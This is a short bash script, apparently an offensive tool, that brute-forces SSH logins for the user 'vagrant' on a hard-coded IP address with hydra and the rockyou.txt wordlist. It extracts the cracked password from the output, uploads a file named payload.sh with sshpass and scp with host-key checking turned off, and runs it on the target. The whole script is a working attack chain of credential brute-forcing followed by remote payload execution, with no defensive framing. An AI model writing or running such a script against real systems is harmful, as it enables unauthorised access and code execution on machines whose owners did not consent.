#!/bin/bash

TARGET_IP="33.57.84.200"
TARGET_PORT="22"
TARGET_USER="vagrant"
WORDLIST="rockyou.txt"

hydra -l $TARGET_USER -P $WORDLIST -v ssh://$TARGET_IP:$TARGET_PORT 2>&1 | tee hydra_output.txt | grep "\[22\]\[ssh\]"

PASSWORD=$(grep -oP 'password:\s*\K\S+' hydra_output.txt | head -1)
echo "[+] Пароль: $PASSWORD"

sshpass -p "$PASSWORD" scp -o StrictHostKeyChecking=no payload.sh $TARGET_USER@$TARGET_IP:/tmp/
sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no $TARGET_USER@$TARGET_IP "bash /tmp/payload.sh && cat /tmp/pwned.txt"
